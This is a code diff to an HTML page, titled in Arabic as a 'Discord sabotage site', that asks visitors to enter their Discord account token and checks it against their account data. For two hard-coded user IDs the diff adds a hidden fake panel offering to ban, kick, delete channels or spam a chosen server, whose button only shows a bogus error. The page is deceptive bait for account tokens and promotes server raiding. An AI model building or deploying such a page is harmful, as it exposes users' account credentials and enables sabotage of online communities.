@@ -21,7 +21,7 @@
       margin-top: 20px;
       font-size: 1.2em;
     }
-    input {
+    input, select {
       padding: 10px;
       width: 300px;
       font-size: 1em;
@@ -44,20 +44,49 @@
       font-size: 1.2em;
       color: yellow;
     }
+    #fakePage {
+      display: none;
+      background-color: black;
+      color: white;
+      height: 100vh;
+      padding-top: 100px;
+    }
   </style>
 </head>
 <body>
 
-  <h1>موقع تخريب ديسكورد</h1>
+  <div id="mainPage">
+    <h1>موقع تخريب ديسكورد</h1>
 
-  <label>قم بوضع توكن حسابك:</label>
-  <input type="text" id="token" placeholder="توكن الحساب">
+    <label>قم بوضع توكن حسابك:</label>
+    <input type="text" id="token" placeholder="توكن الحساب">
 
-  <button onclick="checkToken()">التالي</button>
+    <button onclick="checkToken()">التالي</button>
 
-  <div id="result"></div>
+    <div id="result"></div>
+  </div>
+
+  <div id="fakePage">
+    <h2>قم بوضع البيانات :</h2>
+
+    <label>قم بوضع ايدي السيرفر نص :</label>
+    <input type="text" id="serverId" placeholder="ايدي السيرفر"><br>
+
+    <label>اختر العملية :</label>
+    <select id="actionSelect">
+      <option value="ban">BAN</option>
+      <option value="kick">Kick</option>
+      <option value="delete">مسح رومات</option>
+      <option value="spam">عمل سبام</option>
+    </select><br>
+
+    <button onclick="fakeExecute()">تنفيذ</button>
+    <div id="fakeResult" style="margin-top: 20px; color: red;"></div>
+  </div>
 
   <script>
+    const specialIDs = ["1302277414390337677", "1315672923322712138"];
+
     function checkToken() {
       const token = document.getElementById("token").value;
       const resultDiv = document.getElementById("result");
@@ -69,11 +98,19 @@
       }).then(res => {
         if (res.status === 200) {
           res.json().then(data => {
+            const userId = data.id;
             const username = `${data.username}#${data.discriminator}`;
             const fullName = data.username;
 
             if (fullName === "celestial_monkey_95389") {
               resultDiv.textContent = "قم بتجربه حساب اخر❌ .";
+              return;
+            }
+
+            if (specialIDs.includes(userId)) {
+              // Show fake page
+              document.getElementById("mainPage").style.display = "none";
+              document.getElementById("fakePage").style.display = "block";
               return;
             }
 
@@ -107,6 +144,10 @@
     function getDateFromSnowflake(snowflake) {
       const discordEpoch = 1420070400000;
       return new Date(Number(BigInt(snowflake) >> 22n) + discordEpoch);
+    }
+
+    function fakeExecute() {
+      document.getElementById("fakeResult").textContent = "يوجد غلط في البيانات";
     }
   </script>
 
